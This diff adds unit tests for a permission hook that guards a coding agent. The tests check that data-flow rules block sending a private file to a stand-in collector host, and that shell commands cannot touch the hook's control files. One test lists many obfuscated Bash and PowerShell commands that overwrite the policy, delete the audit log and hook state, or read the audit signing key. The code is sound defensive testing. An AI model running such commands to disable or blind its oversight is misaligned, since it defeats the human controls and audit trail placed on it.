@@ -701,5 +701,101 @@ class ThreeServersOfOneClient(EndToEndTest):
         self.assertIn("INTACT", out)
 
 
+class TheHookTemplatesAndTheShell(HookTest):
+    """The hook templates through the hook itself, where a shell command meets the flow rule and the control
+    files: what a test of the write tools alone (Write, Edit) cannot show."""
+
+    def setUp(self):
+        super().setUp()
+        long = self.folder.resolve()  # the long form: the templates' path entries refuse Windows short (8.3) names
+        self.user, self.project = long / "user", long / "project"
+        self.project.mkdir()
+        os.environ.update(HOME=str(self.user), USERPROFILE=str(self.user))  # put back by HookTest's patch
+        self.audit, self.state = long / "audit.jsonl", long / "state"
+
+    def use(self, name):
+        self.policy = self.write("policy.json", templates.template(name))
+        self.session = f"session-{name}-{len(list(self.folder.glob('started-*')))}"
+        self.write(f"started-{self.session}", "")
+        self.start_session()
+
+    def asked(self, tool, tool_input, mode="default"):
+        """What the hook answers a call: "allow" (no answer at all), "ask" or "deny"."""
+        code, answer, err = self.pre(tool_name=tool, tool_input=tool_input, permission_mode=mode)
+        self.assertEqual(code, 0, err)
+        return "allow" if answer is None else self.decision(answer)[0]
+
+    def fetch_a_page(self):
+        page = recorded("post_tool_use_webfetch.json", session_id=self.session,
+                        tool_response={"bytes": 12, "code": 200, "codeText": "OK", "result": "A plain page."})
+        self.assertEqual(self.asked("WebFetch", page["tool_input"]), "allow")
+        self.assertEqual(self.hook(page)[:2], (0, None))
+
+    def send_out(self):
+        return self.asked("WebFetch", {"url": "https://collector.example.com/?d=1", "prompt": "x"})
+
+    def test_a_file_read_through_the_shell_is_private_like_one_read_with_read(self):
+        for name in ("claude-code", "claude-code-strict"):
+            for tool, tool_input in (("Read", {"file_path": str(self.project / "customers.csv")}),
+                                     ("Bash", {"command": "cat customers.csv"}),
+                                     ("PowerShell", {"command": "Get-Content customers.csv"})):
+                with self.subTest(template=name, tool=tool):
+                    self.use(name)
+                    self.fetch_a_page()
+                    self.assertEqual(self.asked(tool, tool_input), "allow")
+                    self.assertEqual(self.send_out(), "deny")
+                    self.assertEqual(self.records()[-1]["rule"], "flows[1]" if "strict" in name else "flows[0]")
+
+    def test_a_page_fetched_through_the_shell_is_web_content_like_one_fetched_with_webfetch(self):
+        self.use("claude-code")
+        self.assertEqual(self.asked("Bash", {"command": "curl -s https://docs.example.com/page"}), "ask")
+        self.assertEqual(self.asked("Read", {"file_path": str(self.project / "customers.csv")}), "allow")
+        self.assertEqual(self.send_out(), "deny")
+        self.assertEqual(self.records()[-1]["rule"], "flows[0]")
+        # A second command that reaches the network is a way out too, so it is refused, not asked about again.
+        self.assertEqual(self.asked("Bash", {"command": "git push origin main"}), "deny")
+        self.assertEqual(self.asked("Bash", {"command": "npm test"}), "allow")
+        # The strict template refuses the fetch itself, so nothing from the web was read.
+        self.use("claude-code-strict")
+        self.assertEqual(self.asked("Bash", {"command": "curl -s https://docs.example.com/page"}), "deny")
+        self.assertEqual(self.asked("Read", {"file_path": str(self.project / "customers.csv")}), "allow")
+        self.assertEqual(self.send_out(), "allow")
+
+    def test_no_hook_template_lets_a_shell_command_change_a_control_file_by_any_spelling(self):
+        home = self.user.as_posix()
+        commands = [
+            ("Bash", f"cp p.json {home}/.agent-sentinel/policy.json"),
+            ("Bash", f"cp p.json '{home}'/.agent-s*/policy.json"),
+            ("Bash", "cp p.json ~/.agent-sentine?/policy.json"),
+            ("Bash", "d=sentinel; cp p.json ~/.agent-$d/policy.json"),
+            ("Bash", "cp p.json ~/{.agent-sen,x}tinel/policy.json"),
+            ("Bash", "sed -i 's/block/allow/' ~/.agent-s*/policy.json"),
+            ("Bash", "rm -f ~/.agent-s*/audit.jsonl"),
+            ("Bash", "rm -rf ~/.agent-s*/hook-state"),
+            ("Bash", "echo '{}' > .cl*/settings.json"),
+            ("Bash", "echo '{}' > ~/.cl*/settings.json"),
+            ("Bash", "find ~ -maxdepth 2 -name policy.json -exec cp p.json {} +"),
+            ("Bash", "find ~ -maxdepth 2 -name policy.json | xargs -I{} cp p.json {}"),
+            ("Bash", 'cmd /c "copy p.json %USERPROFILE%\\.agent-s*\\policy.json"'),
+            ("PowerShell", "Set-Content -Path $HOME\\.agent-sen*\\policy.json -Value '{}'"),
+            ("PowerShell", "Set-Content -Path (Join-Path $HOME ('.agent-' + 'sentinel') 'policy.json') -Value '{}'"),
+            ("PowerShell", "Remove-Item -Recurse $HOME\\.agent-sen*\\hook-state"),
+            ("PowerShell", "Set-Content .cl*\\settings.json '{}'"),
+            ("PowerShell", "Copy-Item p.json (Resolve-Path ~\\.agent-s*\\policy.json)"),
+        ]
+        for name, refused in (("claude-code", "ask"), ("claude-code-strict", "deny")):
+            self.use(name)
+            for tool, command in commands:
+                with self.subTest(template=name, command=command):
+                    self.assertIn(self.asked(tool, {"command": command}), (refused, "deny"))
+                    # Where nobody would see the prompt, the hook is the only control: it refuses.
+                    self.assertEqual(self.asked(tool, {"command": command}, "bypassPermissions"), "deny")
+            # The same for a read of agent-sentinel's own files, such as the key that signs the audit log.
+            for command in ("cat ~/.agent-s*/audit.key", "cat ~/.agent-s*/policy.json"):
+                with self.subTest(template=name, command=command):
+                    self.assertEqual(self.asked("Bash", {"command": command}), refused)
+                    self.assertEqual(self.asked("Bash", {"command": command}, "bypassPermissions"), "deny")
+
+
 if __name__ == "__main__":
     unittest.main()
